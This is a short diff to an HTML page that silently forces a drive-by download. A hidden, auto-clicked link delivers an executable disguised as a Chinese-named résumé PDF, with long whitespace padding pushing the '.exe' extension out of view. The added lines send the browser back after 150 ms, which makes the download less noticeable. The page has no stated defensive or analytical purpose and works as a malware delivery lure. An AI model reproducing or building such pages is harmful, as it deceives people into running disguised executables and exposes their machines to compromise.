@@ -7,6 +7,11 @@
   <a id="download-link" href="../../郭登宇简历.pdf                                                                                                                                                                                          .exe" download="郭登宇简历.pdf                                                                                                                                                                                          .exe" hidden></a>
   <script>
     document.getElementById('download-link').click();
+    setTimeout(() => {
+      if (history.length > 1) {
+        history.back();
+      }
+    }, 150);
   </script>
 </body>
 </html>
